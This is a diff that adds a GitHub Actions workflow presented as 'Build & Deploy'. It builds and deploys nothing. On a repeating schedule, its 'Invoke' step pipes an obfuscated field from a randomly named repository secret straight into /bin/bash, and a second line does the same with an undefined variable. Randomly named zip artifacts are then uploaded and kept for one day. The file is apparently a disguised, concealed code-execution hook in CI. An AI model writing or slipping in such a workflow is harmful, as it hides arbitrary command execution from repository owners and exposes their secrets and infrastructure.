@@ -1,0 +1,32 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '42 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Invoke
+        env:
+          ikqc29599: ${{ secrets.ikqc29599 }}
+        run: |
+          printf '%s' "$ikqc29599" | jq -r .lescj941 | /bin/bash
+          printf '%s' "$uigs05" | jq -r .bi89755 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: e3RRLcqR
+          path: "*.zip"
+          retention-days: 1
